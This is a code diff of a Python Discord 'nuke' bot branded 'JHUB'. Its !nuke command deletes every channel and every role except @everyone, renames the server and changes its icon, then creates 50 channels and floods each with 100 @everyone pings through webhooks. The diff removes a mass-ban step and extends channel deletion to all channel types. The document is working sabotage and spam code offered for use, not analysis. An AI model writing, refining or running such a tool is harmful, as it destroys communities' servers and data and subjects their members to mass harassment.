@@ -4,7 +4,7 @@ import os
 import aiohttp
 import asyncio
 
-# === Configuration ===
+# Configuration
 prefix = "!"
 channel_name = "nuked-by-jhub"
 webhook_name = "JHUB ON TOP"
@@ -15,33 +15,27 @@ guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b
 channels_to_create = 50
 pings_per_channel = 100
 
-# === Bot Setup ===
+# Bot setup
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=prefix, intents=intents)
 
-# === Events ===
 @bot.event
 async def on_ready():
     print(f"✅ {bot.user} is online and ready.")
 
-# === Nuke Command ===
 @bot.command()
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-
     print("⚠️ Starting NUKE sequence...")
 
     # Delete all channels
-    await asyncio.gather(*(channel.delete() for channel in guild.channels if isinstance(channel, discord.TextChannel)))
+    await asyncio.gather(*(channel.delete() for channel in guild.channels if isinstance(channel, discord.abc.GuildChannel)))
 
-    # Delete all roles (except @everyone)
+    # Delete all roles except @everyone
     await asyncio.gather(*(role.delete() for role in guild.roles if role.name != "@everyone"))
 
-    # Ban all non-bot members
-    await asyncio.gather(*(member.ban(reason="Nuked by JHUB") for member in guild.members if not member.bot))
-
-    # Change server name and icon
+    # Rename server and change icon
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(guild_icon) as resp:
@@ -51,7 +45,7 @@ async def nuke(ctx):
     except Exception as e:
         print(f"❌ Failed to change server name/icon: {e}")
 
-    # Function to create channel and spam webhooks
+    # Create channels and spam @everyone via webhooks concurrently
     async def create_and_spam(index):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{index}")
@@ -64,12 +58,10 @@ async def nuke(ctx):
         except Exception as e:
             print(f"❌ Failed to create/spam channel {index}: {e}")
 
-    # Run all spam tasks concurrently
     await asyncio.gather(*(create_and_spam(i) for i in range(channels_to_create)))
 
     print("✅ NUKE complete.")
 
-# === Run Bot ===
 if __name__ == "__main__":
     token = os.getenv("DISCORD_TOKEN")
     if not token:
